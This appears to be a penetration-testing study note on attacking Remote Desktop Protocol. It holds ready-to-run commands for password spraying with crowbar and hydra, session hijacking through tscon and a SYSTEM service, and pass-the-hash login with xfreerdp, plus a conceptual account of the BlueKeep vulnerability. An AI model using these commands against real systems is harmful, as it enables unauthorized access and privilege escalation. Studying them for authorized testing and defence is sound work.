- [Remote Desktop Protocol (RDP)](https://en.wikipedia.org/wiki/Remote_Desktop_Protocol) is a proprietary protocol developed by Microsoft which provides a user with a graphical interface to connect to another computer over a network connection.
- By default, RDP uses port `TCP/3389`. 

# Enumeration
---
- `nmap -Pn -p3389 192.168.2.143 `

# Misconfigurations
---
- Since RDP takes user credentials for authentication, one common attack vector against the RDP protocol is password guessing.
- We should consider the **client's password policy** on Windows.

## Password Guessing 
- Using the Crowbar tool, we can perform a password spraying attack against the RDP service:
	- `crowbar -b rdp -s 192.168.220.142/32 -U users.txt -c 'password123'`
- Using Hydra:
	- `hydra -L usernames.txt -p 'password123' 192.168.2.143 rdp`

# Protocol Specific Attacks
---
## RDP Session Hijacking
- If a **user is connected via RDP to our compromised machine**, we can ==**hijack the user's remote desktop session to escalate our privileges**== and impersonate the account.
- To successfully impersonate a user without their password, **==we need to have `SYSTEM` privileges and use the Microsoft [tscon.exe](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/tscon) binary==** that enables users to **connect to another desktop session.**
- It works by specifying which `SESSION ID` (`4` for the `lewen` session in our example) we would like to connect to which session name (`rdp-tcp#13`, which is our current session).
- So, for example, the following command will open a new console as the specified `SESSION_ID` within our current RDP session:
	- `query user`
		- ![[Pasted image 20250712052122.png]]
	- `tscon #{TARGET_SESSION_ID} /dest:#{OUR_SESSION_NAME}`

-  **Getting SYSTEM permissions using Session Hijacking**:
	- If we have local administrator privileges, **we can use several methods to obtain `SYSTEM` privileges, such as [PsExec](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec)** or [Mimikatz](https://github.com/gentilkiwi/mimikatz)
	- A simple trick is to ==**create a Windows service that**,== by default, **will run as `Local System` and will execute any binary with `SYSTEM` privileges.**
	- First, **we specify the service name (`sessionhijack`) and the `binpath`, which is the command we want to execute**:
		- `sc.exe create sessionhijack binpath= "cmd.exe /k tscon 2 /dest:rdp-tcp#13"`
	- To run the command, we can start the `sessionhijack` service :
		- `net start sessionhijack`
	- Once the service is started, **a new terminal with the `lewen` user session will appear.** With this new account, we can attempt to discover what kind of privileges it has on the network, and maybe we'll get lucky.

- **Note**: This method no longer works on Server 2019.

# RDP Pass-the-Hash (PtH)
---
- [[Pass the Hash (PtH)]] - **Pass the Hash with RDP (Linux)**
	- Contains Registry Bypass for Admin login erro
- `xfreerdp /v:192.168.220.152 /u:lewen /pth:300FF5E89EF33F83A8146C10F5AB9BB9`

# Latest RDP Vulnerabilities
---
- In 2019, a critical vulnerability was published in the RDP (`TCP/3389`) service that also led to remote code execution (`RCE`) with the identifier [CVE-2019-0708](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2019-0708).
- This vulnerability is **==known as `BlueKeep`==**. It does **NOT require prior access to the system** to exploit the service for our purposes.

## The Concept of the Attack
- The vulnerability is also based, as with SMB, on manipulated requests sent to the targeted service.
- The vulnerability occurs **after initializing the connection when basic settings are exchanged between client and server.** This is known as a [Use-After-Free](https://cwe.mitre.org/data/definitions/416.html) (`UAF`) technique that uses freed memory to execute arbitrary code.
- After the function has been exploited and the memory has been freed, **data is written to the kernel, which allows us to overwrite the kernel memory.**
- This memory is used to write our instructions into the freed memory and let the CPU execute them.

	![[Pasted image 20250712054816.png]]

- **`950,000` Windows systems were identified as vulnerable to `Bluekeep`** attacks in an initial scan in May 2019, and even today, about `a quarter` of those hosts are still vulnerable.

**Note**: This is a flaw that we will likely run into during our penetration tests, but it **can cause system instability, including a "blue screen of death (BSoD),"** and we should be careful before using the associated exploit. I